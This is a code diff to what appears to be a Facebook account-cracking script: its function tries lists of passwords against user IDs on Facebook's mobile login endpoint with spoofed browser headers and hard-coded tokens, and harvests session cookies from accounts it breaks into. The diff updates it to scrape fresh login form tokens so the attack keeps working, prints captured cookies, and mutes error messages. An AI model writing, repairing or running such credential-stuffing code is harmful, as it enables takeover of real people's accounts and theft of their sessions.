@@ -1249,7 +1249,7 @@ def p(uid,pwx,tl):
     try:
         for pw in pwx:
             Session = requests.Session()
-            free_fb = Session.get('https://m.facebook.com').text
+            free_fb = Session.get('https://touch.facebook.com').text
             cookies = {
             'datr': '7DnMaEaBSi1euh0ZrTxnFPXZ',
             'sb': '7DnMaMKotlR75LUbGLYU-TYB',
@@ -1269,7 +1269,7 @@ def p(uid,pwx,tl):
             'x-response-format': 'JSONStream',
             'sec-ch-ua-mobile': '?1',
             'x-asbd-id': '359341',
-            'x-fb-lsd': 'AdEVi-OFg_s',
+            'x-fb-lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             'x-requested-with': 'XMLHttpRequest',
             'origin': 'https://limited.facebook.com',
             'sec-fetch-site': 'same-origin',
@@ -1289,8 +1289,8 @@ def p(uid,pwx,tl):
             'cancel': 'https://staticxx.facebook.com/x/connect/xd_arbiter/?version=46',
             'lwv': '100',}
             data = {
-            'm_ts': '1758859976',
-            'li': 'yBLWaNo3yCbGoJgrOxFDDjjk',
+            'm_ts': re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
+            'li': re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
             'try_number': '0',
             'unrecognized_tries': '0',
             'email': uid,
@@ -1305,8 +1305,8 @@ def p(uid,pwx,tl):
             'bi_xrwh': '92004344361786634',
             'encpass': "#PWD_BROWSER:0:{}:{}".format(str(time.time()).split('.')[0], pw),
             'fb_dtsg': 'NAfup2Me3JHXJFN2yxBY35qKn-1LtNpMqJhQzaJ3AqYbs8PMFOvFhGw:0:0',
-            'jazoest': '24862',
-            'lsd': 'AdEVi-OFg_s',
+            'jazoest': re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
+            'lsd': re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
             '_dyn': '1KQdAG1mws8-t0BBBzEnwuo98nwgU2owpUuwcC4o1nEhw23E52q1ew6ywaq1Jw20Ehw73wGwcq0RE1u81x82ew5fw5NyE1582ZwrU2pw4swSw7zwde0UE',
             'csr': '',
             'hsdp': '',
@@ -1326,6 +1326,7 @@ def p(uid,pwx,tl):
                 cok = Session.cookies.get_dict()
                 cid = cok["c_user"]
                 coki = ";".join([key+"="+value for key,value in Session.cookies.get_dict().items()])
+                print(f" {green}chek : {green}{coki}")
                 check = check_lock(cid)
                 if "live" in check:
                     bkas.append(cid)
@@ -1352,7 +1353,7 @@ def p(uid,pwx,tl):
     except ce:
         time.sleep(20)
     except Exception as error:
-        print({error})
+        #print({error})
         pass
 
 def x(uid,pwx,tl):
